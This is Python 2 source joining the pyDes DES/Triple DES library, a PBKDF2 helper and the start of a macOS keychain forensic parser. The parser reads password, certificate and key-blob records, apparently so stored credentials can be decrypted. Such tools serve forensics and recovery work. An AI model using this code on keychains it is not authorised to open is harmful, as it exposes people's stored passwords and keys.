            # Permutate the concatination of B[1] to B[8] (Bn)
            self.R = self.__permutate(des.__p, Bn)

            # Xor with L[i - 1]
            self.R = map(lambda x, y: x ^ y, self.R, self.L)
            # Optimization: This now replaces the below commented code
            #j = 0
            #while j < len(self.R):
            #   self.R[j] = self.R[j] ^ self.L[j]
            #   j += 1

            # L[i] becomes R[i - 1]
            self.L = tempR

            i += 1
            iteration += iteration_adjustment

        # Final permutation of R[16]L[16]
        self.final = self.__permutate(des.__fp, self.R + self.L)
        return self.final


    # Data to be encrypted/decrypted
    def crypt(self, data, crypt_type):
        '''Crypt the data in blocks, running it through des_crypt'''

        # Error check the data
        if not data:
            return ''
        if len(data) % self.block_size != 0:
            if crypt_type == des.DECRYPT:  # Decryption must work on 8 byte blocks
                raise ValueError(
                    "Invalid data length, data must be a multiple of " + str(self.block_size) + " bytes\n.")
            if not self.getPadding():
                raise ValueError("Invalid data length, data must be a multiple of " + str(
                    self.block_size) + " bytes\n. Try setting the optional padding character")
            else:
                data += (self.block_size - (len(data) % self.block_size)) * self.getPadding()
            # print "Len of data: %f" % (len(data) / self.block_size)

        if self.getMode() == CBC:
            if self.getIV():
                iv = self.__String_to_BitList(self.getIV())
            else:
                raise ValueError("For CBC mode, you must supply the Initial Value (IV) for ciphering")

        # Split the data into blocks, crypting each one seperately
        i = 0
        dict = {}
        result = []
        #cached = 0
        #lines = 0
        while i < len(data):
            # Test code for caching encryption results
            #lines += 1
            #if dict.has_key(data[i:i+8]):
            #print "Cached result for: %s" % data[i:i+8]
            #   cached += 1
            #   result.append(dict[data[i:i+8]])
            #   i += 8
            #   continue

            block = self.__String_to_BitList(data[i:i + 8])

            # Xor with IV if using CBC mode
            if self.getMode() == CBC:
                if crypt_type == des.ENCRYPT:
                    block = map(lambda x, y: x ^ y, block, iv)
                #j = 0
                #while j < len(block):
                #   block[j] = block[j] ^ iv[j]
                #   j += 1

                processed_block = self.__des_crypt(block, crypt_type)

                if crypt_type == des.DECRYPT:
                    processed_block = map(lambda x, y: x ^ y, processed_block, iv)
                    #j = 0
                    #while j < len(processed_block):
                    #   processed_block[j] = processed_block[j] ^ iv[j]
                    #   j += 1
                    iv = block
                else:
                    iv = processed_block
            else:
                processed_block = self.__des_crypt(block, crypt_type)


            # Add the resulting crypted block to our list
            #d = self.__BitList_to_String(processed_block)
            #result.append(d)
            result.append(self.__BitList_to_String(processed_block))
            #dict[data[i:i+8]] = d
            i += 8

        # print "Lines: %d, cached: %d" % (lines, cached)

        # Remove the padding from the last block
        if crypt_type == des.DECRYPT and self.getPadding():
            #print "Removing decrypt pad"
            s = result[-1]
            while s[-1] == self.getPadding():
                s = s[:-1]
            result[-1] = s

        # Return the full crypted string
        return ''.join(result)

    def encrypt(self, data, pad=''):
        '''encrypt(data, [pad]) -> string

        data : String to be encrypted
        pad  : Optional argument for encryption padding. Must only be one byte

        The data must be a multiple of 8 bytes and will be encrypted
        with the already specified key. Data does not have to be a
        multiple of 8 bytes if the padding character is supplied, the
        data will then be padded to a multiple of 8 bytes with this
        pad character.
        '''
        self.__padding = pad
        return self.crypt(data, des.ENCRYPT)

    def decrypt(self, data, pad=''):
        '''decrypt(data, [pad]) -> string

        data : String to be encrypted
        pad  : Optional argument for decryption padding. Must only be one byte

        The data must be a multiple of 8 bytes and will be decrypted
        with the already specified key. If the optional padding character
        is supplied, then the un-encypted data will have the padding characters
        removed from the end of the string. This pad removal only occurs on the
        last 8 bytes of the data (last data block).
        '''
        self.__padding = pad
        return self.crypt(data, des.DECRYPT)


#############################################################################
#               Triple DES                  #
#############################################################################
class triple_des:
    '''Triple DES encryption/decrytpion class

    This algorithm uses the DES-EDE3 (when a 24 byte key is supplied) or
    the DES-EDE2 (when a 16 byte key is supplied) encryption methods.
    Supports ECB (Electronic Code Book) and CBC (Cypher Block Chaining) modes.

    pyDes.des(key, [mode], [IV])

    key  -> The encryption key string, must be either 16 or 24 bytes long
    mode -> Optional argument for encryption type, can be either pyDes.ECB
        (Electronic Code Book), pyDes.CBC (Cypher Block Chaining)
    IV   -> Optional string argument, must be supplied if using CBC mode.
        Must be 8 bytes in length.
    '''

    def __init__(self, key, mode=ECB, IV=None):
        self.block_size = 8
        self.setMode(mode)
        self.__padding = ''
        self.__iv = IV
        self.setKey(key)

    def getKey(self):
        '''getKey() -> string'''
        return self.__key

    def setKey(self, key):
        '''Will set the crypting key for this object. Either 16 or 24 bytes long'''
        self.key_size = 24  # Use DES-EDE3 mode
        if len(key) != self.key_size:
            if len(key) == 16:  # Use DES-EDE2 mode
                self.key_size = 16
            else:
                raise ValueError("Invalid triple DES key size. Key must be either 16 or 24 bytes long")
        if self.getMode() == CBC and (not self.getIV() or len(self.getIV()) != self.block_size):
            raise ValueError("Invalid IV, must be 8 bytes in length")  ## TODO: Check this
        # modes get handled later, since CBC goes on top of the triple-des
        self.__key1 = des(key[:8])
        self.__key2 = des(key[8:16])
        if self.key_size == 16:
            self.__key3 = self.__key1
        else:
            self.__key3 = des(key[16:])
        self.__key = key

    def getMode(self):
        '''getMode() -> pyDes.ECB or pyDes.CBC'''
        return self.__mode

    def setMode(self, mode):
        '''Sets the type of crypting mode, pyDes.ECB or pyDes.CBC'''
        self.__mode = mode

    def getIV(self):
        '''getIV() -> string'''
        return self.__iv

    def setIV(self, IV):
        '''Will set the Initial Value, used in conjunction with CBC mode'''
        self.__iv = IV

    def xorstr(self, x, y):
        '''Returns the bitwise xor of the bytes in two strings'''
        if len(x) != len(y):
            raise "string lengths differ %d %d" % (len(x), len(y))

        ret = ''
        for i in range(len(x)):
            ret += chr(ord(x[i]) ^ ord(y[i]))

        return ret

    def encrypt(self, data, pad=''):
        '''encrypt(data, [pad]) -> string

        data : String to be encrypted
        pad  : Optional argument for encryption padding. Must only be one byte

        The data must be a multiple of 8 bytes and will be encrypted
        with the already specified key. Data does not have to be a
        multiple of 8 bytes if the padding character is supplied, the
        data will then be padded to a multiple of 8 bytes with this
        pad character.
        '''
        if self.getMode() == ECB:
            # simple
            data = self.__key1.encrypt(data, pad)
            data = self.__key2.decrypt(data)
            return self.__key3.encrypt(data)

        if self.getMode() == CBC:
            raise "This code hasn't been tested yet"
            if len(data) % self.block_size != 0:
                raise "CBC mode needs datalen to be a multiple of blocksize (ignoring padding for now)"

            # simple
            lastblock = self.getIV()
            retdata = ''
            for i in range(0, len(data), self.block_size):
                thisblock = data[i:i + self.block_size]
                # the XOR for CBC
                thisblock = self.xorstr(lastblock, thisblock)
                thisblock = self.__key1.encrypt(thisblock)
                thisblock = self.__key2.decrypt(thisblock)
                lastblock = self.__key3.encrypt(thisblock)
                retdata += lastblock
            return retdata

        raise "Not reached"

    def decrypt(self, data, pad=''):
        '''decrypt(data, [pad]) -> string

        data : String to be encrypted
        pad  : Optional argument for decryption padding. Must only be one byte

        The data must be a multiple of 8 bytes and will be decrypted
        with the already specified key. If the optional padding character
        is supplied, then the un-encypted data will have the padding characters
        removed from the end of the string. This pad removal only occurs on the
        last 8 bytes of the data (last data block).
        '''
        if self.getMode() == ECB:
            # simple
            data = self.__key3.decrypt(data)
            data = self.__key2.encrypt(data)
            return self.__key1.decrypt(data, pad)

        if self.getMode() == CBC:
            if len(data) % self.block_size != 0:
                raise "Can only decrypt multiples of blocksize"

            lastblock = self.getIV()
            retdata = ''
            for i in range(0, len(data), self.block_size):
                # can I arrange this better? probably...
                cipherchunk = data[i:i + self.block_size]
                thisblock = self.__key3.decrypt(cipherchunk)
                thisblock = self.__key2.encrypt(thisblock)
                thisblock = self.__key1.decrypt(thisblock)
                retdata += self.xorstr(lastblock, thisblock)
                lastblock = cipherchunk
            return retdata

        raise "Not reached"


#############################################################################
#               Examples                    #
#############################################################################
def example_triple_des():
    from time import time

    # Utility module
    from binascii import unhexlify as unhex

    # example shows triple-des encryption using the des class
    print "Example of triple DES encryption in default ECB mode (DES-EDE3)\n"

    print "Triple des using the des class (3 times)"
    t = time()
    k1 = des(unhex("133457799BBCDFF1"))
    k2 = des(unhex("1122334455667788"))
    k3 = des(unhex("77661100DD223311"))
    d = "Triple DES test string, to be encrypted and decrypted..."
    print "Key1:      %s" % k1.getKey()
    print "Key2:      %s" % k2.getKey()
    print "Key3:      %s" % k3.getKey()
    print "Data:      %s" % d

    e1 = k1.encrypt(d)
    e2 = k2.decrypt(e1)
    e3 = k3.encrypt(e2)
    print "Encrypted: " + e3

    d3 = k3.decrypt(e3)
    d2 = k2.encrypt(d3)
    d1 = k1.decrypt(d2)
    print "Decrypted: " + d1
    print "DES time taken: %f (%d crypt operations)" % (time() - t, 6 * (len(d) / 8))
    print ""

    # Example below uses the triple-des class to achieve the same as above
    print "Now using triple des class"
    t = time()
    t1 = triple_des(unhex("133457799BBCDFF1112233445566778877661100DD223311"))
    print "Key:       %s" % t1.getKey()
    print "Data:      %s" % d

    td1 = t1.encrypt(d)
    print "Encrypted: " + td1

    td2 = t1.decrypt(td1)
    print "Decrypted: " + td2

    print "Triple DES time taken: %f (%d crypt operations)" % (time() - t, 6 * (len(d) / 8))


def example_des():
    from time import time

    # example of DES encrypting in CBC mode with the IV of "\0\0\0\0\0\0\0\0"
    print "Example of DES encryption using CBC mode\n"
    t = time()
    k = des("DESCRYPT", CBC, "\0\0\0\0\0\0\0\0")
    data = "DES encryption algorithm"
    print "Key      : " + k.getKey()
    print "Data     : " + data

    d = k.encrypt(data)
    print "Encrypted: " + d

    d = k.decrypt(d)
    print "Decrypted: " + d
    print "DES time taken: %f (6 crypt operations)" % (time() - t)
    print ""


def __test__():
    example_des()
    example_triple_des()


def __fulltest__():
    # This should not produce any unexpected errors or exceptions
    from binascii import unhexlify as unhex
    from binascii import hexlify as dohex

    __test__()
    print ""

    k = des("\0\0\0\0\0\0\0\0", CBC, "\0\0\0\0\0\0\0\0")
    d = k.encrypt("DES encryption algorithm")
    if k.decrypt(d) != "DES encryption algorithm":
        print "Test 1 Error: Unencypted data block does not match start data"

    k = des("\0\0\0\0\0\0\0\0", CBC, "\0\0\0\0\0\0\0\0")
    d = k.encrypt("Default string of text", '*')
    if k.decrypt(d, "*") != "Default string of text":
        print "Test 2 Error: Unencypted data block does not match start data"

    k = des("\r\n\tABC\r\n")
    d = k.encrypt("String to Pad", '*')
    if k.decrypt(d) != "String to Pad***":
        print "'%s'" % k.decrypt(d)
        print "Test 3 Error: Unencypted data block does not match start data"

    k = des("\r\n\tABC\r\n")
    d = k.encrypt(unhex("000102030405060708FF8FDCB04080"), unhex("44"))
    if k.decrypt(d, unhex("44")) != unhex("000102030405060708FF8FDCB04080"):
        print "Test 4a Error: Unencypted data block does not match start data"
    if k.decrypt(d) != unhex("000102030405060708FF8FDCB0408044"):
        print "Test 4b Error: Unencypted data block does not match start data"

    k = triple_des("MyDesKey\r\n\tABC\r\n0987*543")
    d = k.encrypt(unhex(
        "000102030405060708FF8FDCB04080000102030405060708FF8FDCB04080000102030405060708FF8FDCB04080000102030405060708FF8FDCB04080000102030405060708FF8FDCB04080000102030405060708FF8FDCB04080000102030405060708FF8FDCB04080000102030405060708FF8FDCB04080"))
    if k.decrypt(d) != unhex(
            "000102030405060708FF8FDCB04080000102030405060708FF8FDCB04080000102030405060708FF8FDCB04080000102030405060708FF8FDCB04080000102030405060708FF8FDCB04080000102030405060708FF8FDCB04080000102030405060708FF8FDCB04080000102030405060708FF8FDCB04080"):
        print "Test 5 Error: Unencypted data block does not match start data"

    k = triple_des("\r\n\tABC\r\n0987*543")
    d = k.encrypt(unhex(
        "000102030405060708FF8FDCB04080000102030405060708FF8FDCB04080000102030405060708FF8FDCB04080000102030405060708FF8FDCB04080000102030405060708FF8FDCB04080000102030405060708FF8FDCB04080000102030405060708FF8FDCB04080000102030405060708FF8FDCB04080"))
    if k.decrypt(d) != unhex(
            "000102030405060708FF8FDCB04080000102030405060708FF8FDCB04080000102030405060708FF8FDCB04080000102030405060708FF8FDCB04080000102030405060708FF8FDCB04080000102030405060708FF8FDCB04080000102030405060708FF8FDCB04080000102030405060708FF8FDCB04080"):
        print "Test 6 Error: Unencypted data block does not match start data"


def __filetest__():
    from time import time

    f = open("pyDes.py", "rb+")
    d = f.read()
    f.close()

    t = time()
    k = des("MyDESKey")

    d = k.encrypt(d, " ")
    f = open("pyDes.py.enc", "wb+")
    f.write(d)
    f.close()

    d = k.decrypt(d, " ")
    f = open("pyDes.py.dec", "wb+")
    f.write(d)
    f.close()
    print "DES file test time: %f" % (time() - t)


def __profile__():
    import profile

    profile.run('__fulltest__()')

#profile.run('__filetest__()')



#!/usr/bin/env python

# A simple implementation of pbkdf2 using stock python modules. See RFC2898
# for details. Basically, it derives a key from a password and salt.

# (c) 2004 Matt Johnston <matt @ ucc asn au>
# This code may be freely used and modified for any purpose.

import sha
import hmac

from binascii import hexlify, unhexlify
from struct import pack

BLOCKLEN = 20

# this is what you want to call.
def pbkdf2(password, salt, itercount, keylen, hashfn=sha):
    # l - number of output blocks to produce
    l = keylen / BLOCKLEN
    if keylen % BLOCKLEN != 0:
        l += 1

    h = hmac.new(password, None, hashfn)

    T = ""
    for i in range(1, l + 1):
        T += pbkdf2_F(h, salt, itercount, i)

    return T[: -( BLOCKLEN - keylen % BLOCKLEN)]


def xorstr(a, b):
    if len(a) != len(b):
        raise "xorstr(): lengths differ"

    ret = ''
    for i in range(len(a)):
        ret += chr(ord(a[i]) ^ ord(b[i]))

    return ret


def prf(h, data):
    hm = h.copy()
    hm.update(data)
    return hm.digest()


# Helper as per the spec. h is a hmac which has been created seeded with the
# password, it will be copy()ed and not modified.
def pbkdf2_F(h, salt, itercount, blocknum):
    U = prf(h, salt + pack('>i', blocknum))
    T = U

    for i in range(2, itercount + 1):
        U = prf(h, U)
        T = xorstr(T, U)

    return T


def test():
    # test vector from rfc3211
    password = 'password'
    salt = unhexlify('1234567878563412')
    password = 'All n-entities must communicate with other n-entities via n-1 entiteeheehees'
    itercount = 500
    keylen = 16
    ret = pbkdf2(password, salt, itercount, keylen)
    print "key:      %s" % hexlify(ret)
    print "expected: 6A 89 70 BF 68 C9 2C AE A8 4A 8D F2 85 10 85 86"





#!/usr/bin/env python

# Author : n0fate
# E-Mail rapfer@gmail.com, n0fate@n0fate.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or (at
# your option) any later version.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU
# General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307 USA
#

import argparse
import os
from sys import exit
import struct
from binascii import unhexlify
import datetime


#from pbkdf2 import pbkdf2

#from pyDes import triple_des, CBC
from ctypes import *
#from Schema import *

def hexdump(src, length=16):
    FILTER = ''.join([(len(repr(chr(x))) == 3) and chr(x) or '.' for x in range(256)])
    lines = []
    for c in xrange(0, len(src), length):
        chars = src[c:c+length]
        hex = ' '.join(["%02x" % ord(x) for x in chars])
        printable = ''.join(["%s" % ((ord(x) <= 127 and FILTER[ord(x)]) or '.') for x in chars])
        lines.append("%04x  %-*s  %s\n" % (c, length*3, hex, printable))
    print ''.join(lines)
    
ATOM_SIZE = 4
SIZEOFKEYCHAINTIME = 16

KEYCHAIN_SIGNATURE = "kych"

DBBLOB_SIGNATURE = unhexlify('fade0711')

BLOCKSIZE = 8
KEYLEN = 24

class _APPL_DB_HEADER(BigEndianStructure):
    _fields_ = [
        ("Signature", c_char*4),
        ("Version", c_int),
        ("HeaderSize", c_int),
        ("SchemaOffset", c_int),
        ("AuthOffset", c_int)
    ]

class _APPL_DB_SCHEMA(BigEndianStructure):
    _fields_ = [
        ("SchemaSize", c_int),
        ("TableCount", c_int)
    ]

class _KEY_BLOB_REC_HEADER(BigEndianStructure):
    _fields_ = [
        ("RecordSize", c_uint),
        ("RecordCount", c_uint),
        ("Dummy", c_char*0x7C),
    ]

class _KEY_BLOB_RECORD(BigEndianStructure):
    _fields_ = [
        ("Signature", c_uint),
        ("Version", c_uint),
        ("CipherOffset", c_uint),
        ("TotalLength", c_uint)
    ]

class _GENERIC_PW_HEADER(BigEndianStructure):
    _fields_ = [
        ("RecordSize", c_uint),
        ("RecordNumber", c_uint),
        ("Unknown2", c_uint),
        ("Unknown3", c_uint),
        ("SSGPArea", c_uint),
        ("Unknown5", c_uint),
        ("CreationDate", c_uint),
        ("ModDate", c_uint),
        ("Description", c_uint),
        ("Comment", c_uint),
        ("Creator", c_uint),
        ("Type", c_uint),
        ("ScriptCode", c_uint),
        ("PrintName", c_uint),
        ("Alias", c_uint),
        ("Invisible", c_uint),
        ("Negative", c_uint),
        ("CustomIcon", c_uint),
        ("Protected", c_uint),
        ("Account", c_uint),
        ("Service", c_uint),
        ("Generic", c_uint)
    ]

class _APPLE_SHARE_HEADER(BigEndianStructure):
    _fields_ = [
        ("RecordSize", c_uint),
        ("RecordNumber", c_uint),
        ("Unknown2", c_uint),
        ("Unknown3", c_uint),
        ("SSGPArea", c_uint),
        ("Unknown5", c_uint),
        ("CreationDate", c_uint),
        ("ModDate", c_uint),
        ("Description", c_uint),
        ("Comment", c_uint),
        ("Creator", c_uint),
        ("Type", c_uint),
        ("ScriptCode", c_uint),
        ("PrintName", c_uint),
        ("Alias", c_uint),
        ("Invisible", c_uint),
        ("Negative", c_uint),
        ("CustomIcon", c_uint),
        ("Protected", c_uint),
        ("Account", c_uint),
        ("Volume", c_uint),
        ("Server", c_uint),
        ("Protocol", c_uint),
        ("AuthType", c_uint),
        ("Address", c_uint),
        ("Signature", c_uint)
    ]

class _INTERNET_PW_HEADER(BigEndianStructure):
    _fields_ = [
        ("RecordSize", c_uint),
        ("RecordNumber", c_uint),
        ("Unknown2", c_uint),
        ("Unknown3", c_uint),
        ("SSGPArea", c_uint),
        ("Unknown5", c_uint),
        ("CreationDate", c_uint),
        ("ModDate", c_uint),
        ("Description", c_uint),
        ("Comment", c_uint),
        ("Creator", c_uint),
        ("Type", c_uint),
        ("ScriptCode", c_uint),
        ("PrintName", c_uint),
        ("Alias", c_uint),
        ("Invisible", c_uint),
        ("Negative", c_uint),
        ("CustomIcon", c_uint),
        ("Protected", c_uint),
        ("Account", c_uint),
        ("SecurityDomain", c_uint),
        ("Server", c_uint),
        ("Protocol", c_uint),
        ("AuthType", c_uint),
        ("Port", c_uint),
        ("Path", c_uint)
    ]

class _X509_CERT_HEADER(BigEndianStructure):
    _fields_ = [
        ("RecordSize", c_uint),
        ("RecordNumber", c_uint),
        ("Unknown1", c_uint),
        ("Unknown2", c_uint),
        ("CertSize", c_uint),
        ("Unknown3", c_uint),
        ("CertType", c_uint),
        ("CertEncoding", c_uint),
        ("PrintName", c_uint),
        ("Alias", c_uint),
        ("Subject", c_uint),
        ("Issuer", c_uint),
        ("SerialNumber", c_uint),
        ("SubjectKeyIdentifier", c_uint),
        ("PublicKeyHash", c_uint)
    ]

# http://www.opensource.apple.com/source/Security/Security-55179.1/include/security_cdsa_utilities/KeySchema.h
# http://www.opensource.apple.com/source/libsecurity_keychain/libsecurity_keychain-36940/lib/SecKey.h
class _SECKEY_HEADER(BigEndianStructure):
    _fields_ = [
        ("RecordSize", c_uint),
        ("RecordNumber", c_uint),
        ("Unknown1", c_uint),
        ("Unknown2", c_uint),
        ("BlobSize", c_uint),
        ("Unknown3", c_uint),
        ("KeyClass", c_uint),
        ("PrintName", c_uint),
        ("Alias", c_uint),
        ("Permanent", c_uint),
        ("Private", c_uint),
        ("Modifiable", c_uint),
        ("Label", c_uint),
        ("ApplicationTag", c_uint),
        ("KeyCreator", c_uint),
        ("KeyType", c_uint),
        ("KeySizeInBits", c_uint),
        ("EffectiveKeySize", c_uint),
        ("StartDate", c_uint),
        ("EndDate", c_uint),
        ("Sensitive", c_uint),
        ("AlwaysSensitive", c_uint),
        ("Extractable", c_uint),
        ("NeverExtractable", c_uint),
        ("Encrypt", c_uint),
        ("Decrypt", c_uint),
        ("Derive", c_uint),
        ("Sign", c_uint),
        ("Verify", c_uint),
        ("SignRecover", c_uint),
        ("VerifyRecover", c_uint),
        ("Wrap", c_uint),
        ("Wrap", c_uint)
    ]

class _TABLE_HEADER(BigEndianStructure):
    _fields_ = [
        ("TableSize", c_uint),
        ("TableId", c_uint),
        ("RecordCount", c_uint),
        ("Records", c_uint),
        ("IndexesOffset", c_uint),
        ("FreeListHead", c_uint),
        ("RecordNumbersCount", c_uint),
        #("RecordNumbers", c_uint)
    ]

class _SCHEMA_INFO_RECORD(BigEndianStructure):
    _fields_ = [
        ("RecordSize", c_uint),
        ("RecordNumber", c_uint),
        ("Unknown2", c_uint),
        ("Unknown3", c_uint),
        ("Unknown4", c_uint),
        ("Unknown5", c_uint),
        ("Unknown6", c_uint),
        ("RecordType", c_uint),
        ("DataSize", c_uint),
        ("Data", c_uint)
    ]

class _ENCRYPTED_BLOB_METADATA(BigEndianStructure):
    _fields_ = [
        ("MagicNumber", c_uint),
        ("Unknown", c_uint),
        ("StartOffset", c_uint),
        ("EndOffset", c_uint)
    ]

def _memcpy(buf, fmt):
    return cast(c_char_p(buf), POINTER(fmt)).contents


class KeyChain():
    def __init__(self, filepath):
        self.filepath = filepath
        self.fbuf = ''

    def open(self):
        try:
            fhandle = open(self.filepath, 'rb')
        except:
            return False
        self.fbuf = fhandle.read()
        if len(self.fbuf):
            fhandle.close()
            return True
        return False

    def checkValidKeychain(self):
        if self.fbuf[0:4] != KEYCHAIN_SIGNATURE:
            return False
        return True

    ## get apple DB Header
    def getHeader(self):
        header = _memcpy(self.fbuf[:sizeof(_APPL_DB_HEADER)], _APPL_DB_HEADER)

        return header

    def getSchemaInfo(self, offset):
        table_list = []
        #schema_info = struct.unpack(APPL_DB_SCHEMA, self.fbuf[offset:offset + APPL_DB_SCHEMA_SIZE])
        _schemainfo = _memcpy(self.fbuf[offset:offset+sizeof(_APPL_DB_SCHEMA)], _APPL_DB_SCHEMA)
        for i in xrange(_schemainfo.TableCount):
            BASE_ADDR = sizeof(_APPL_DB_HEADER) + sizeof(_APPL_DB_SCHEMA)
            table_list.append(
                struct.unpack('>I', self.fbuf[BASE_ADDR + (ATOM_SIZE * i):BASE_ADDR + (ATOM_SIZE * i) + ATOM_SIZE])[0])

        return _schemainfo, table_list

    def getTable(self, offset):
        record_list = []
        BASE_ADDR = sizeof(_APPL_DB_HEADER) + offset

        TableMetaData = _memcpy(self.fbuf[BASE_ADDR:BASE_ADDR+sizeof(_TABLE_HEADER)], _TABLE_HEADER)

        RECORD_OFFSET_BASE = BASE_ADDR + sizeof(_TABLE_HEADER)

        record_count = 0
        offset = 0
        while TableMetaData.RecordCount != record_count:
            RecordOffset = struct.unpack('>I', self.fbuf[
                                                RECORD_OFFSET_BASE + (ATOM_SIZE * offset):RECORD_OFFSET_BASE + (
                                                    ATOM_SIZE * offset) + ATOM_SIZE])[0]
            # if len(record_list) >= 1:
            #     if record_list[len(record_list)-1] >= RecordOffset:
            #         continue
            if (RecordOffset != 0x00) and (RecordOffset%4 == 0):
                record_list.append(RecordOffset)
                #print ' [-] Record Offset: 0x%.8x'%RecordOffset
                record_count += 1
            offset +=1

        return TableMetaData, record_list

    def getTablenametoList(self, recordList, tableList):
        TableDic = {}
        for count in xrange(len(recordList)):
            tableMeta, GenericList = self.getTable(tableList[count])
            TableDic[tableMeta.TableId] = count    # extract valid table list

        return len(recordList), TableDic

    def getSchemaInfoRecord(self, base_addr, offset):

        record_meta = []
        record = []

        BASE_ADDR = sizeof(_APPL_DB_HEADER) + base_addr + offset

        #print BASE_ADDR

        RecordMetadata = _memcpy(self.fbuf[BASE_ADDR:BASE_ADDR+sizeof(_SCHEMA_INFO_RECORD)], _SCHEMA_INFO_RECORD)

        data = self.fbuf[BASE_ADDR + 40:BASE_ADDR + 40 + RecordMetadata.DataSize]

        for record_element in RecordMetadata:
            record.append(record_element)

        record.append(data)

        return record

    def getKeyblobRecord(self, base_addr, offset):

        BASE_ADDR = sizeof(_APPL_DB_HEADER) + base_addr + offset

        KeyBlobRecHeader = _memcpy(self.fbuf[BASE_ADDR:BASE_ADDR+sizeof(_KEY_BLOB_REC_HEADER)], _KEY_BLOB_REC_HEADER)


        # record_meta[0] => record size
        record = self.fbuf[BASE_ADDR + sizeof(_KEY_BLOB_REC_HEADER):BASE_ADDR + KeyBlobRecHeader.RecordSize]  # password data area

        KeyBlobRecord = _memcpy(record[:sizeof(_KEY_BLOB_RECORD)], _KEY_BLOB_RECORD)

        if SECURE_STORAGE_GROUP != str(record[KeyBlobRecord.TotalLength + 8:KeyBlobRecord.TotalLength + 8 + 4]):
            #print 'not ssgp %s'%str(record[KeyBlobRecord.TotalLength + 8:KeyBlobRecord.TotalLength + 8 + 4])
            #exit()
            return '', '', '', 1

        CipherLen = KeyBlobRecord.TotalLength - KeyBlobRecord.CipherOffset
        if CipherLen % BLOCKSIZE != 0:
            print "Bad ciphertext len"

        iv = record[16:24]

        ciphertext = record[KeyBlobRecord.CipherOffset:KeyBlobRecord.TotalLength]

        # match data, keyblob_ciphertext, Initial Vector, success
        return record[KeyBlobRecord.TotalLength + 8:KeyBlobRecord.TotalLength + 8 + 20], ciphertext, iv, 0


    def getGenericPWRecord(self, base_addr, offset):
        record = []

        BASE_ADDR = sizeof(_APPL_DB_HEADER) + base_addr + offset

        RecordMeta = _memcpy(self.fbuf[BASE_ADDR:BASE_ADDR+sizeof(_GENERIC_PW_HEADER)], _GENERIC_PW_HEADER)

        Buffer = self.fbuf[BASE_ADDR + sizeof(_GENERIC_PW_HEADER):BASE_ADDR + RecordMeta.RecordSize]  # record_meta[0] => record size

        if RecordMeta.SSGPArea != 0:
            record.append(Buffer[:RecordMeta.SSGPArea])
        else:
            record.append('')
        
        record.append(self.getKeychainTime(BASE_ADDR, RecordMeta.CreationDate & 0xFFFFFFFE))
        record.append(self.getKeychainTime(BASE_ADDR, RecordMeta.ModDate & 0xFFFFFFFE))

        record.append(self.getLV(BASE_ADDR, RecordMeta.Description & 0xFFFFFFFE))

        record.append(self.getFourCharCode(BASE_ADDR, RecordMeta.Creator & 0xFFFFFFFE))
        record.append(self.getFourCharCode(BASE_ADDR, RecordMeta.Type & 0xFFFFFFFE))

        record.append(self.getLV(BASE_ADDR, RecordMeta.PrintName & 0xFFFFFFFE))
        record.append(self.getLV(BASE_ADDR, RecordMeta.Alias & 0xFFFFFFFE))
        record.append(self.getLV(BASE_ADDR, RecordMeta.Account & 0xFFFFFFFE))
        record.append(self.getLV(BASE_ADDR, RecordMeta.Service & 0xFFFFFFFE))

        return record

    def getInternetPWRecord(self, base_addr, offset):
        record = []

        BASE_ADDR = sizeof(_APPL_DB_HEADER) + base_addr + offset

        RecordMeta = _memcpy(self.fbuf[BASE_ADDR:BASE_ADDR+sizeof(_INTERNET_PW_HEADER)], _INTERNET_PW_HEADER)

        Buffer = self.fbuf[BASE_ADDR + sizeof(_INTERNET_PW_HEADER):BASE_ADDR + RecordMeta.RecordSize]

        if RecordMeta.SSGPArea != 0:
            record.append(Buffer[:RecordMeta.SSGPArea])
        else:
            record.append('')

        record.append(self.getKeychainTime(BASE_ADDR, RecordMeta.CreationDate & 0xFFFFFFFE))
        record.append(self.getKeychainTime(BASE_ADDR, RecordMeta.ModDate & 0xFFFFFFFE))

        record.append(self.getLV(BASE_ADDR, RecordMeta.Description & 0xFFFFFFFE))
        record.append(self.getLV(BASE_ADDR, RecordMeta.Comment & 0xFFFFFFFE))

        record.append(self.getFourCharCode(BASE_ADDR, RecordMeta.Creator & 0xFFFFFFFE))
        record.append(self.getFourCharCode(BASE_ADDR, RecordMeta.Type & 0xFFFFFFFE))

        record.append(self.getLV(BASE_ADDR, RecordMeta.PrintName & 0xFFFFFFFE))
        record.append(self.getLV(BASE_ADDR, RecordMeta.Alias & 0xFFFFFFFE))
        record.append(self.getLV(BASE_ADDR, RecordMeta.Protected & 0xFFFFFFFE))
        record.append(self.getLV(BASE_ADDR, RecordMeta.Account & 0xFFFFFFFE))
        record.append(self.getLV(BASE_ADDR, RecordMeta.SecurityDomain & 0xFFFFFFFE))
        record.append(self.getLV(BASE_ADDR, RecordMeta.Server & 0xFFFFFFFE))

        record.append(self.getFourCharCode(BASE_ADDR, RecordMeta.Protocol & 0xFFFFFFFE))

        record.append(self.getLV(BASE_ADDR, RecordMeta.AuthType & 0xFFFFFFFE))

        record.append(self.getInt(BASE_ADDR, RecordMeta.Port & 0xFFFFFFFE))

        record.append(self.getLV(BASE_ADDR, RecordMeta.Path & 0xFFFFFFFE))        

        return record

    def getx509Record(self, base_addr, offset):
        record = []

        BASE_ADDR = sizeof(_APPL_DB_HEADER) + base_addr + offset

        RecordMeta = _memcpy(self.fbuf[BASE_ADDR:BASE_ADDR+sizeof(_X509_CERT_HEADER)], _X509_CERT_HEADER)

        x509Certificate = self.fbuf[BASE_ADDR + sizeof(_X509_CERT_HEADER):BASE_ADDR + sizeof(_X509_CERT_HEADER) + RecordMeta.CertSize]

        record.append(self.getInt(BASE_ADDR, RecordMeta.CertType & 0xFFFFFFFE))     # Cert Type
        record.append(self.getInt(BASE_ADDR, RecordMeta.CertEncoding & 0xFFFFFFFE))     # Cert Encoding

        record.append(self.getLV(BASE_ADDR, RecordMeta.PrintName & 0xFFFFFFFE))
        record.append(self.getLV(BASE_ADDR, RecordMeta.Alias & 0xFFFFFFFE))
        record.append(self.getLV(BASE_ADDR, RecordMeta.Subject & 0xFFFFFFFE))
        record.append(self.getLV(BASE_ADDR, RecordMeta.Issuer & 0xFFFFFFFE))
        record.append(self.getLV(BASE_ADDR, RecordMeta.SerialNumber & 0xFFFFFFFE))
